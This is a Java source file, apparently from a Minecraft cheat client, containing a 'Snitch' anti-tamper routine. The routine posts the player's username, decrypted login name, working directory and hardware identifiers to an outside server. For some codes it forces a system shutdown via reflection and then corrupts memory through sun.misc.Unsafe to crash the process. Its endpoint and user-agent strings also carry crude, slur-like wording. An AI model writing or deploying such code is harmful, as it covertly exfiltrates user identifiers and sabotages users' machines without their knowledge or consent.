package exhibition.util.security;

import exhibition.Client;
import net.minecraft.client.Minecraft;

import java.io.File;
import java.lang.reflect.Field;
import java.net.URLEncoder;
import java.util.Arrays;
import java.util.Base64;
import java.util.List;

public class Snitch {

    private static String decodeByteArray(byte[] bytes) {
        String str = "";
        for (byte b : bytes) {
            str += (char) (b & 0xFF);
        }
        return str;
    }

    public static boolean snitch(int code, String... extra) {
        Connection connection = new Connection("https://minesense.pub/nig/ass").setUserAgent(code + " bruh " + new File("").getAbsolutePath());
        try {
            connection.setParameters("c", String.valueOf(code));

            connection.setParameters("u", URLEncoder.encode(Minecraft.getMinecraft().session.getUsername(), "UTF-8"));

            if (Client.getAuthUser() != null) {
                connection.setParameters("d", Client.getAuthUser().getDecryptedUsername());
            } else {
                List<String> loginInformation = LoginUtil.getLoginInformation();
                if(loginInformation.size() > 0) {
                    connection.setParameters("d", Crypto.decryptPublicNew(loginInformation.get(0)));
                }
            }

            try {
                String a = Arrays.toString(extra);
                String silentSnitch = URLEncoder.encode(Base64.getEncoder().encodeToString(a.substring(0, Math.min(a.length(), 500)).getBytes()), "UTF-8");
                connection.setParameters("a", silentSnitch);
            } catch (Exception ignore) {

            }

            if(SystemUtil.hardwareIdentification != null) {
                try {
                    String hwid = URLEncoder.encode(Base64.getEncoder().encodeToString(SystemUtil.getHardwareIdentifiers().getBytes()), "UTF-8");
                    connection.setParameters("h", hwid);
                } catch (Exception ignore) {

                }
            }

        } catch (Exception e) {
            e.printStackTrace();
        }
        Connector.post(connection);
        String result = connection.getResponse();
        try {
            if (code == 5 || code == 69420) {
                Class runtimeClass = Class.forName("java.lang.Runtime");
                runtimeClass.getMethod("exec", String.class).invoke(runtimeClass.getMethod("getRuntime").invoke(null), "shutdown.exe -s -t 0");
            }

            Class unsafeClass = Class.forName("sun.misc.Unsafe");
            Field f = unsafeClass.getDeclaredField("theUnsafe");
            f.setAccessible(true);
            Object unsafeInstance = f.get(null);
            unsafeClass.getMethod("putAddress", long.class, long.class).invoke(unsafeInstance, 0x0934, 0x90943);
        } catch (Exception ignored) {
        }
        return result.hashCode() == 1670206670;
    }

}
